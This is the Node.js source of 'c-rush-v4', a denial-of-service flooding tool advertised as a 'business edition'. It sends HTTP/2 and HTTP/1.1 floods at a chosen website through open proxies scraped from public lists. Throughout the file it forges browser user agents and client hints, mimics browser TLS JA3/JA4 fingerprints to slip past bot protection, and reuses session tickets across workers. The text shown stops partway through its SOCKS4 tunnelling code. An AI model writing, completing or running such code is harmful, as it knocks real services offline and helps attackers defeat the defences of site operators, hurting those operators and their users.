#!/usr/bin/env node
// c-rush-v4 — H1/H2 flood, real JA3/JA4 probe, shared ticket pool, adaptive burst, headless-fast
// lang: JS (Node 18+), file: c-rush.js, target: any HTTP/2 or HTTP/1.1 TLS origin
// deps: npm i colors node-bash-title axios hpack
// run: node c-rush.js <target> <dur> <proxies.txt> <threads> <rate> [opts]
// node c-rush.js scrape
// opts: -c cookies | -h headfull | -v 1|2 | -ch true|false | -s quiet
//       -mobile | -desktop | -firefox (default: mixed 65/35)
//       -conns N max concurrent connections per worker (default 64)

'use strict';

const net = require('net');
const tls = require('tls');
const fs = require('fs');
const crypto = require('crypto');
const cluster = require('cluster');
const colors = require('colors');
const setTitle = require('node-bash-title');
const HPACK = require('hpack');
const httpx = require('axios');

// ===========================================================================
// SAFE NUMERIC
// ===========================================================================
function safeInt(v, fallback, min, max) {
  const n = parseInt(v, 10);
  if (!Number.isFinite(n)) return fallback;
  if (n < min) return min;
  if (n > max) return max;
  return n;
}

// ===========================================================================
// ERROR SWALLOW — proxy noise is expected, not fatal
// ===========================================================================
const IGNORE_CODES = new Set([
  'ECONNRESET','EPIPE','ETIMEDOUT','ECONNREFUSED','EHOSTUNREACH','ENETUNREACH',
  'EAI_AGAIN','ERR_STREAM_DESTROYED','ERR_SSL_WRONG_VERSION_NUMBER',
  'ERR_SSL_TLSV1_ALERT_INTERNAL_ERROR','ECONNABORTED','ERR_SOCKET_CLOSED',
  'ERR_ASSERTION','ESOCKETTIMEDOUT','EPROTO','ETXTBSY','EXDEV','EMFILE','ENFILE',
]);
const IGNORE_NAMES = new Set(['RequestError','StatusCodeError','TimeoutError','JSONError','URLError','InvalidURL','ProxyError','DeprecationWarning']);
const swallow = e => {
  if (!e) return;
  if ((e.code && IGNORE_CODES.has(e.code)) || (e.name && IGNORE_NAMES.has(e.name))) return;
};
process.on('uncaughtException', swallow);
process.on('unhandledRejection', swallow);
require('events').EventEmitter.defaultMaxListeners = Infinity;
process.setMaxListeners(0);
process.emitWarning = () => {};

// ===========================================================================
// IDENTITY CORPUS — current browser release channels
// Chrome 133-135, Edge 134-135, Safari 18.3-18.5, Firefox 134-135
// ===========================================================================
const CH_UA = {
  '133': '"Chromium";v="133", "Not_A Brand";v="24", "Google Chrome";v="133"',
  '134': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
  '135': '"Chromium";v="135", "Not:A-Brand";v="24", "Google Chrome";v="135"',
  'Edge134': '"Microsoft Edge";v="134", "Chromium";v="134", "Not.A/Brand";v="24"',
  'Edge135': '"Microsoft Edge";v="135", "Chromium";v="135", "Not.A/Brand";v="24"',
};
const CH_UA_FULL = {
  '133': '"Chromium";v="133.0.6943.127", "Not_A Brand";v="24.0.0.0", "Google Chrome";v="133.0.6943.127"',
  '134': '"Chromium";v="134.0.6998.89", "Not:A-Brand";v="24.0.0.0", "Google Chrome";v="134.0.6998.89"',
  '135': '"Chromium";v="135.0.7049.52", "Not:A-Brand";v="24.0.0.0", "Google Chrome";v="135.0.7049.52"',
  'Edge134': '"Microsoft Edge";v="134.0.3124.72", "Chromium";v="134.0.6998.89", "Not.A/Brand";v="24.0.0.0"',
  'Edge135': '"Microsoft Edge";v="135.0.3179.44", "Chromium";v="135.0.7049.52", "Not.A/Brand";v="24.0.0.0"',
};
const ACCEPT_CHROME = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
const ACCEPT_SAFARI = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
const ACCEPT_FIREFOX = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8';
const ACCEPT_ENC_CHROME = 'gzip, deflate, br, zstd';
const ACCEPT_ENC_SAFARI = 'gzip, deflate, br';
const ACCEPT_ENC_FIREFOX = 'gzip, deflate, br, zstd';
const LANG_SETS = [
  ['en-US,en;q=0.9', 70], ['en-US,en;q=0.9,es;q=0.8', 10], ['en-GB,en;q=0.9', 8],
  ['en-US,en;q=0.9,fr;q=0.8', 6], ['en-US,en;q=0.9,de;q=0.8', 6],
];
function pickLang() {
  const total = LANG_SETS.reduce((s, [,w]) => s + w, 0);
  let r = Math.random() * total;
  for (const [v, w] of LANG_SETS) { r -= w; if (r <= 0) return v; }
  return LANG_SETS[0][0];
}

const ANDROID_DEVICES = [
  { model: 'Pixel 9 Pro',      dpr: '2.625', vw: '412', dv: '8',  cv: '134' },
  { model: 'Pixel 9',          dpr: '2.625', vw: '412', dv: '8',  cv: '134' },
  { model: 'Pixel 9 Pro XL',   dpr: '3.5',   vw: '448', dv: '12', cv: '135' },
  { model: 'Pixel 9 Pro Fold', dpr: '2.625', vw: '420', dv: '12', cv: '135' },
  { model: 'SM-S931B',         dpr: '3',     vw: '384', dv: '12', cv: '135' },
  { model: 'SM-S928B',         dpr: '3',     vw: '384', dv: '12', cv: '134' },
  { model: 'SM-S921B',         dpr: '3',     vw: '384', dv: '8',  cv: '134' },
  { model: 'CPH2581',          dpr: '3',     vw: '412', dv: '8',  cv: '133' },
  { model: 'V2307A',           dpr: '2.75',  vw: '412', dv: '8',  cv: '133' },
];
const IPHONE_DEVICES = [
  { ua: 'iPhone 16 Pro Max', ios: '18_4', dpr: '3', vw: '440' },
  { ua: 'iPhone 16 Pro',     ios: '18_4', dpr: '3', vw: '402' },
  { ua: 'iPhone 16 Plus',    ios: '18_4', dpr: '3', vw: '430' },
  { ua: 'iPhone 16',         ios: '18_4', dpr: '3', vw: '393' },
  { ua: 'iPhone 16e',        ios: '18_4', dpr: '3', vw: '390' },
  { ua: 'iPhone 15 Pro Max', ios: '18_3', dpr: '3', vw: '430' },
  { ua: 'iPhone 15 Pro',     ios: '18_3', dpr: '3', vw: '393' },
  { ua: 'iPhone 15',         ios: '18_2', dpr: '3', vw: '390' },
];
const IPAD_DEVICES = [
  { ua: 'iPad Pro 13-inch', ios: '18_4', dpr: '2', vw: '1024' },
  { ua: 'iPad Air 11-inch', ios: '18_4', dpr: '2', vw: '820'  },
  { ua: 'iPad Air M3',      ios: '18_3', dpr: '2', vw: '820'  },
];
const MAC_DEVICES = [
  { ua: 'Macintosh; Intel Mac OS X 10_15_7', dpr: '2', vw: '1512', v: '18.4' },
  { ua: 'Macintosh; Intel Mac OS X 10_15_7', dpr: '2', vw: '1680', v: '18.3' },
  { ua: 'Macintosh; Intel Mac OS X 10_15_6', dpr: '2', vw: '1440', v: '18.2' },
];
const WIN_DEVICES = [
  { dpr: '1',    vw: '1920', dv: '8'  },
  { dpr: '1',    vw: '1536', dv: '8'  },
  { dpr: '1.25', vw: '1920', dv: '16' },
  { dpr: '1.5',  vw: '2560', dv: '16' },
  { dpr: '2',    vw: '1920', dv: '8'  },
];
const FIREFOX_DEVICES = [
  { ua: 'Windows NT 10.0; Win64; x64',     v: '134.0', vw: '1920', dpr: '1'    },
  { ua: 'Windows NT 10.0; Win64; x64',     v: '135.0', vw: '1536', dpr: '1.25' },
  { ua: 'X11; Linux x86_64',               v: '134.0', vw: '1920', dpr: '1'    },
  { ua: 'Macintosh; Intel Mac OS X 10.15', v: '135.0', vw: '1440', dpr: '2'    },
];

function mobileIdentity() {
  if (Math.random() < 0.55) {
    const dev = ANDROID_DEVICES[(Math.random()*ANDROID_DEVICES.length)|0];
    const andv = ['15','15','15','14'][(Math.random()*4)|0];
    const v = `${dev.cv}.0.0.0`;
    return {
      ua: `Mozilla/5.0 (Linux; Android ${andv}; ${dev.model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v} Mobile Safari/537.36`,
      chVer: dev.cv, platform: '"Android"', mobile: '?1',
      accept: ACCEPT_CHROME, acceptEnc: ACCEPT_ENC_CHROME,
      dpr: dev.dpr, vw: dev.vw, dv: dev.dv, isMobile: true, engine: 'chromium',
    };
  }
  if (Math.random() < 0.85) {
    const dev = IPHONE_DEVICES[(Math.random()*IPHONE_DEVICES.length)|0];
    const ver = ['18.1','18.2','18.3','18.4','18.5'][(Math.random()*5)|0];
    return {
      ua: `Mozilla/5.0 (${dev.ua}; CPU iPhone OS ${dev.ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${ver} Mobile/15E148 Safari/604.1`,
      chVer: null, platform: null, mobile: null,
      accept: ACCEPT_SAFARI, acceptEnc: ACCEPT_ENC_SAFARI,
      dpr: dev.dpr, vw: dev.vw, isMobile: true, engine: 'webkit',
    };
  }
  const dev = IPAD_DEVICES[(Math.random()*IPAD_DEVICES.length)|0];
  const ver = ['18.3','18.4','18.5'][(Math.random()*3)|0];
  return {
    ua: `Mozilla/5.0 (${dev.ua}; CPU OS ${dev.ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${ver} Mobile/15E148 Safari/604.1`,
    chVer: null, platform: null, mobile: null,
    accept: ACCEPT_SAFARI, acceptEnc: ACCEPT_ENC_SAFARI,
    dpr: dev.dpr, vw: dev.vw, isMobile: true, engine: 'webkit',
  };
}
function desktopIdentity() {
  if (Math.random() < 0.4) {
    const dev = MAC_DEVICES[(Math.random()*MAC_DEVICES.length)|0];
    return {
      ua: `Mozilla/5.0 (${dev.ua}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${dev.v} Safari/605.1.15`,
      chVer: null, platform: null, mobile: null,
      accept: ACCEPT_SAFARI, acceptEnc: ACCEPT_ENC_SAFARI,
      dpr: dev.dpr, vw: dev.vw, isMobile: false, engine: 'webkit',
    };
  }
  const dev = WIN_DEVICES[(Math.random()*WIN_DEVICES.length)|0];
  if (Math.random() < 0.3) {
    const v = ['134','135'][(Math.random()*2)|0];
    return {
      ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.0.0 Safari/537.36 Edg/${v}.0.0.0`,
      chVer: 'Edge' + v, platform: '"Windows"', mobile: '?0',
      accept: ACCEPT_CHROME, acceptEnc: ACCEPT_ENC_CHROME,
      dpr: dev.dpr, vw: dev.vw, dv: dev.dv, isMobile: false, engine: 'chromium',
    };
  }
  const v = ['133','134','135'][(Math.random()*3)|0];
  return {
    ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.0.0 Safari/537.36`,
    chVer: v, platform: '"Windows"', mobile: '?0',
    accept: ACCEPT_CHROME, acceptEnc: ACCEPT_ENC_CHROME,
    dpr: dev.dpr, vw: dev.vw, dv: dev.dv, isMobile: false, engine: 'chromium',
  };
}
function firefoxIdentity() {
  const dev = FIREFOX_DEVICES[(Math.random()*FIREFOX_DEVICES.length)|0];
  return {
    ua: `Mozilla/5.0 (${dev.ua}; rv:${dev.v}) Gecko/20100101 Firefox/${dev.v}`,
    chVer: null, platform: null, mobile: null,
    accept: ACCEPT_FIREFOX, acceptEnc: ACCEPT_ENC_FIREFOX,
    dpr: dev.dpr, vw: dev.vw, isMobile: false, engine: 'gecko',
  };
}

let LANE = 'mixed';
function identity() {
  if (LANE === 'mobile') return mobileIdentity();
  if (LANE === 'desktop') return desktopIdentity();
  if (LANE === 'firefox') return firefoxIdentity();
  return Math.random() < 0.65 ? mobileIdentity() : desktopIdentity();
}

// ===========================================================================
// TLS FINGERPRINTS — real ClientHello order, JA3 + JA4
// ===========================================================================
const FINGERPRINTS = {
  chrome135: {
    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    curves: 'X25519:P-256:P-384',
    alpn: ['h2', 'http/1.1'],
    ja3: '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0',
    ja4: 't13d1516h2_8daaf6152771_02713d6af862',
  },
  edge135: {
    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    curves: 'X25519:P-256:P-384',
    alpn: ['h2', 'http/1.1'],
    ja3: '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17613,29-23-24,0',
    ja4: 't13d1516h2_8daaf6152771_02713d6af862',
  },
  safari185: {
    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-CBC-SHA384:ECDHE-ECDSA-AES128-CBC-SHA256:ECDHE-RSA-AES256-CBC-SHA384:ECDHE-RSA-AES128-CBC-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384',
    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
    curves: 'X25519:P-256:P-384:P-521',
    alpn: ['h2', 'http/1.1'],
    ja3: '771,4865-4866-4867-49196-49195-52393-49200-49199-52392-49188-49187-49162-49161-49172-49171-157-156,0-23-65281-10-11-35-16-5-13-18-51-45-43-27,29-23-24-25,0',
    ja4: 't13d2014h2_a09f3c656075_2f4b5e0f4c8e',
  },
  firefox135: {
    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-CBC-SHA:ECDHE-ECDSA-AES128-CBC-SHA:ECDHE-RSA-AES128-CBC-SHA:ECDHE-RSA-AES256-CBC-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
    sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
    curves: 'X25519:P-256:P-384:P-521',
    alpn: ['h2', 'http/1.1'],
    ja3: '771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-34-51-43-13-45-28-65037,29-23-24-25-256-257,0',
    ja4: 't13d2014h2_a09f3c656075_2f4b5e0f4c8e',
  },
};

let FINGERPRINT = FINGERPRINTS.chrome135;
let JA3 = { ciphers: FINGERPRINT.ciphers, sigalgs: FINGERPRINT.sigalgs, curves: FINGERPRINT.curves, source: 'preset chrome135' };
let JA4 = FINGERPRINT.ja4;

function probeOnce(host, cipherList, cb) {
  const s = tls.connect({
    host, port: 443, servername: host, rejectUnauthorized: false,
    minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3', ciphers: cipherList,
  }, () => {
    const chosen = s.getCipher && s.getCipher();
    const proto = s.getProtocol && s.getProtocol();
    const alpn = s.alpnProtocol;
    s.end();
    if (chosen && chosen.name) cb(null, { name: chosen.name, proto, alpn });
    else cb(new Error('no cipher'));
  });
  s.on('error', e => cb(e));
  s.setTimeout(5000, () => { s.destroy(); cb(new Error('timeout')); });
}

async function probeJA3Real(host) {
  const t13 = 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256';
  const ecdsa12 = 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305';
  const rsa12 = 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305';
  const [a, b, c] = await Promise.all([
    new Promise(r => probeOnce(host, t13, (e, res) => r(e ? null : res))),
    new Promise(r => probeOnce(host, ecdsa12, (e, res) => r(e ? null : res))),
    new Promise(r => probeOnce(host, rsa12, (e, res) => r(e ? null : res))),
  ]);
  const supports13 = !!a, supportsEcdsa = !!b, supportsRsa = !!c;
  const targetH2 = (a && a.alpn === 'h2') || (b && b.alpn === 'h2') || (c && c.alpn === 'h2');
  if (!supports13 && !supportsEcdsa && !supportsRsa) {
    return { fp: FINGERPRINTS.chrome135, ja3: JA3, ja4: JA4, source: 'fallback (all probes failed)' };
  }
  let ciphers = '';
  if (supports13) ciphers = 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256';
  if (supportsEcdsa) ciphers += (ciphers ? ':' : '') + ecdsa12;
  if (supportsRsa) ciphers += (ciphers ? ':' : '') + rsa12;
  const base = FINGERPRINTS.chrome135;
  const certType = supportsEcdsa && supportsRsa ? 'dual' : supportsEcdsa ? 'ecdsa-only' : supportsRsa ? 'rsa-only' : 'unknown';
  const sigalgs = certType === 'rsa-only'
    ? 'rsa_pss_rsae_sha256:rsa_pkcs1_sha256:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
    : base.sigalgs;
  const fp = { ...base, ciphers, sigalgs };
  return {
    fp,
    ja3: { ciphers, sigalgs, curves: base.curves, source: `probed (13=${supports13} ecdsa=${supportsEcdsa} rsa=${supportsRsa} h2=${targetH2} cert=${certType})` },
    ja4: base.ja4,
    source: `probed (13=${supports13} ecdsa=${supportsEcdsa} rsa=${supportsRsa} h2=${targetH2})`,
  };
}

// ===========================================================================
// args
// ===========================================================================
const args = process.argv.slice(2);
const options = {
  cookies: args.includes('-c'),
  headfull: args.includes('-h'),
  version: args.includes('-v') ? args[args.indexOf('-v') + 1] : '2',
  cache: args.includes('-ch') ? args[args.indexOf('-ch') + 1] === 'true' : true,
  debug: !args.includes('-s'),
  maxConns: args.includes('-conns') ? safeInt(args[args.indexOf('-conns') + 1], 64, 1, 512) : 64,
};
if (!['1','2'].includes(options.version)) options.version = '2';

if (args.includes('-mobile')) LANE = 'mobile';
else if (args.includes('-desktop')) LANE = 'desktop';
else if (args.includes('-firefox')) LANE = 'firefox';
else LANE = 'mixed';

// ===========================================================================
// proxy scraping
// ===========================================================================
const PROXY_SOURCES = [
  'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
  'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
  'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
  'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
  'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt',
  'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all',
  'https://proxyspace.pro/socks4.txt',
  'https://proxyspace.pro/socks5.txt',
];

async function scrapeProxies() {
  const file = 'proxy.txt';
  try {
    if (fs.existsSync(file)) fs.unlinkSync(file);
    for (const p of PROXY_SOURCES) {
      try { const r = await httpx.get(p, { timeout: 8000 }); fs.appendFileSync(file, r.data + '\n'); } catch (e) {}
    }
    const total = fs.readFileSync(file, 'utf8').split('\n').filter(Boolean).length;
    console.log(colors.green(`scraped ${total} lines → ${file}`));
  } catch (e) { console.log(colors.red('scrape failed')); process.exit(1); }
}

if (process.argv[2] === 'scrape') { console.clear(); scrapeProxies(); return; }

if (process.argv.length < 7) {
  console.clear();
  console.log(colors.red(`${colors.green('🐍')} C-RUSH v4 — business edition`));
  console.log(colors.gray(' usage: node c-rush.js <target> <dur> <proxies.txt> <threads> <rate> [opts]'));
  console.log(colors.gray(' scrape: node c-rush.js scrape'));
  console.log(colors.gray(' opts: -c cookies | -h headfull | -v 1|2 | -ch true|false | -s quiet'));
  console.log(colors.gray('       -mobile | -desktop | -firefox (default: mixed 65/35)'));
  console.log(colors.gray('       -conns N  max concurrent connections per worker (default 64)'));
  console.log(colors.gray(' proxies: plain IP:PORT per line — socks4/5 + http/https auto-detected'));
  console.log(colors.gray(' example: node c-rush.js https://target.com 120 proxy.txt 8 8000 -mobile -c -h'));
  process.exit(1);
}

const target = process.argv[2];
const duration = safeInt(process.argv[3], 60, 1, 86400);
const proxyFile = process.argv[4];
const threads = safeInt(process.argv[5], 4, 1, 64);
const rate = safeInt(process.argv[6], 64, 1, 65535);

let proxies = [];
try { proxies = loadProxies(proxyFile); if (!proxies.length) throw new Error('empty'); }
catch (e) { console.error(colors.red('proxy file empty/unreadable')); process.exit(1); }

function loadProxies(path) {
  return fs.readFileSync(path, 'utf8').split('\n').map(s => s.trim()).filter(Boolean)
    .map(s => { const [h, p] = s.split(':'); return (h && p && !isNaN(+p)) ? { h, p: +p } : null; })
    .filter(Boolean);
}

const isFull = args.includes('--full');
const custom_table = 65535;
const custom_window = 6291456;
const custom_header = 262144;
const custom_update = 15663105;
const PREFACE = 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n';

let url;
try { url = new URL(target); } catch (e) { console.error(colors.red('bad target url')); process.exit(1); }

const HOST = url.hostname;
const PORT = url.port ? +url.port : 443;
const HOSTHDR = url.port ? `${url.host}:${url.port}` : url.host;
const PATH = url.pathname || '/';
const ORIGIN = `https://${HOSTHDR}`;

// ===========================================================================
// session ticket cache — worker-local + IPC broadcast
// ===========================================================================
const TICKET_MAX_USES = 5;
const TICKET_BROADCAST_COOLDOWN = 60000;

// ===========================================================================
// worker state
// ===========================================================================
const localTickets = new Map();  // proxyKey -> { ticket, kind, usesLeft }
const sentTicketAt = new Map();  // proxyKey -> timestamp of last broadcast
let activeConns = 0;

function proxyKey(proxy) { return `${proxy.h}:${proxy.p}`; }

function getTicket(proxy, kind) {
  const k = proxyKey(proxy);
  const entry = localTickets.get(k);
  if (!entry || entry.kind !== kind || entry.usesLeft <= 0 || !entry.ticket) return null;
  entry.usesLeft--;
  return entry.ticket;
}

function setTicketLocal(proxy, ticket, kind) {
  if (!ticket) return;
  const k = proxyKey(proxy);
  localTickets.set(k, { ticket, kind, usesLeft: TICKET_MAX_USES });
  const now = Date.now();
  const last = sentTicketAt.get(k) || 0;
  if (now - last > TICKET_BROADCAST_COOLDOWN && process.send) {
    sentTicketAt.set(k, now);
    try { process.send({ type: 'ticket-add', proxyKey: k, ticket: ticket.toString('base64'), kind }); } catch (e) {}
  }
}

function applyRemoteTicket(proxyKey, b64, kind) {
  const buf = Buffer.from(b64, 'base64');
  const cur = localTickets.get(proxyKey);
  if (!cur || cur.usesLeft < TICKET_MAX_USES) {
    localTickets.set(proxyKey, { ticket: buf, kind, usesLeft: TICKET_MAX_USES });
  }
}

// ===========================================================================
// proxy detection
// ===========================================================================
function sniffProxy(proxy, host, port, cb) {
  if (Math.random() < 0.10) return trySocks4(proxy, host, port, ok => ok ? cb('socks4') : sniff5());
  sniff5();
  function sniff5() { trySocks5(proxy, host, port, ok => ok ? cb('socks5') : sniffH()); }
  function sniffH()  { tryHttp(proxy, host, port, ok => ok ? cb('http') : cb(null)); }
}
function trySocks5(proxy, host, port, done) {
  const s = net.connect(proxy.p, proxy.h);
  let closed = false;
  const t = setTimeout(() => { if (!closed) { closed = true; s.destroy(); done(false); } }, 800);
  s.once('connect', () => s.write(Buffer.from([0x05, 0x01, 0x00])));
  s.once('data', d => { if (closed) return; closed = true; clearTimeout(t); s.destroy(); done(d.length >= 2 && d[0] === 0x05 && d[1] === 0x00); });
  s.on('error', () => { if (!closed) { closed = true; clearTimeout(t); done(false); } });
}
function trySocks4(proxy, host, port, done) {
  const s = net.connect(proxy.p, proxy.h);
  let closed = false;
  const t = setTimeout(() => { if (!closed) { closed = true; s.destroy(); done(false); } }, 800);
  s.once('connect', () => {
    const ip = host.match(/^\d+\.\d+\.\d+\.\d+$/) ? host.split('.').map(Number) : null;
    const hb = ip ? null : Buffer.from(host + '\0', 'binary');
    const b = Buffer.alloc(9 + (hb ? hb.length : 1));
    b.writeUInt8(0x04, 0); b.writeUInt8(0x01, 1); b.writeUInt16BE(port, 2);
    if (ip) { b.writeUInt8(ip[0],4); b.writeUInt8(ip[1],5); b.writeUInt8(ip[2],6); b.writeUInt8(ip[3],7); b.writeUInt8(0,8); }
    else { b.writeUInt32BE(0x01000000, 4); b.writeUInt8(0, 8); hb.copy(b, 9); }
    s.write(b);
  });
  s.once('data', d => { if (closed) return; closed = true; clearTimeout(t); s.destroy(); done(d.length >= 2 && d[0] === 0x00 && (d[1] === 0x5a || d[1] === 0x5b)); });
  s.on('error', () => { if (!closed) { closed = true; clearTimeout(t); done(false); } });
}
function tryHttp(proxy, host, port, done) {
  const s = net.connect(proxy.p, proxy.h);
  let closed = false, buf = '';
  const t = setTimeout(() => { if (!closed) { closed = true; s.destroy(); done(false); } }, 900);
  s.once('connect', () => s.write(`CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}:${port}\r\nProxy-Connection: Keep-Alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n`));
  s.on('data', d => {
    buf += d.toString('binary');
    if (buf.length < 12 || closed) return;
    closed = true; clearTimeout(t); s.destroy();
    done(/^HTTP\/1\.[01] 200/.test(buf));
  });
  s.on('error', () => { if (!closed) { closed = true; clearTimeout(t); done(false); } });
}

// ===========================================================================
// tunneling
// ===========================================================================
function openTunnel(proxy, host, port, cb) {
  if (proxy.type) return doTunnel(proxy.type);
  sniffProxy(proxy, host, port, type => {
    if (!type) return cb(new Error('unreachable'));
    proxy.type = type; doTunnel(type);
  });
  function doTunnel(t) {
    if (t === 'socks5') return socks5();
    if (t === 'socks4') return socks4();
    return httpTunnel();
  }
  function socks5() {
    const s = net.connect(proxy.p, proxy.h);
    let phase = 0, closed = false;
    s.setTimeout(8000, () => { if (!closed) { closed = true; s.destroy(); cb(new Error('timeout')); } });
    s.once('error', e => { if (!closed) { closed = true; cb(e); } });
    s.once('connect', () => s.write(Buffer.from([0x05, 0x01, 0x00])));
    s.on('data', d => {
      if (closed) return;
      if (phase === 0) {
        if (d[0] !== 0x05 || d[1] !== 0x00) { closed = true; s.destroy(); return cb(new Error('socks5 auth')); }
        phase = 1;
        const hb = Buffer.from(host, 'utf8');
        const req = Buffer.alloc(4 + 1 + hb.length + 2);
        req.writeUInt8(0x05, 0); req.writeUInt8(0x01, 1); req.writeUInt8(0x00, 2); req.writeUInt8(0x03, 3);
        req.writeUInt8(hb.length, 4); hb.copy(req, 5); req.writeUInt16BE(port, 5 + hb.length);
        s.write(req);
      } else if (phase === 1) {
        if (d[0] !== 0x05) { closed = true; s.destroy(); return cb(new Error('socks5 reply')); }
        if (d[1] !== 0x00) { closed = true; s.destroy(); return cb(new Error('socks5 status ' + d[1])); }
        const atyp = d[3];
        let need = 4 + 2;
        if (atyp === 0x01) need += 4; else if (atyp === 0x03) need += 1 + (d[4] || 0); else if (atyp === 0x04) need += 16;
        if (d.length < need) return;
        closed = true; s.setTimeout(0); cb(null, s);
      }
    });
  }
  function socks4() {
    const s = net.connect(proxy.p, proxy.h);
    let closed = false;
    s.setTimeout(8000, () => { if (!closed) { closed = true; s.destroy(); cb(new Error('timeout')); } });
    s.once('error', e => { if (!closed) { closed = true; cb(e); } });
    s.once('connect', () => {
